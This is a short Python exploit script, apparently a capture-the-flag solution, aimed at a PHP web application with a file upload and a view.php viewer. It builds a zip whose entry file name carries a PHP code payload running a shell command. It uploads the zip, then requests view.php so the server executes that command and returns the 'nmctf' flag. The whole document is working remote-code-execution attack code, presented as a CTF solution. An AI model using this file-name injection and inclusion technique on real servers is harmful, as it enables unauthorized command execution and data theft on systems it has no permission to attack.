#!/usr/bin/env python3
import zipfile
import requests
import re
import sys
import uuid

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

payload_code = '<?= `strings fl*` ?>'

payload_filename = f"/tmp/{uuid.uuid4().hex}.zip"
with zipfile.ZipFile(payload_filename, 'w') as z:
    z.writestr(f"{payload_code}.txt", "")

print(f"[*] Uploading payload...")
r = requests.post(f"{TARGET}/", files={"file": open(payload_filename, "rb")})
m = re.search(r'([a-f0-9]{32}\.zip)', r.text)
if not m:
    print("[-] Upload failed.")
    print(r.text[:1500])
    sys.exit(1)

hash_name = m.group(1)
print(f"[+] Payload uploaded as: {hash_name}")

print(f"[*] Running: strings fl*")
r = requests.get(f"{TARGET}/view.php?file=uploads/{hash_name}")

flag_match = re.search(r'nmctf\{[^}]+\}', r.text)
if flag_match:
    print(f"[+] FLAG: {flag_match.group(0)}")
else:
    print("[-] Flag not found")
    print(r.text[-1000:])
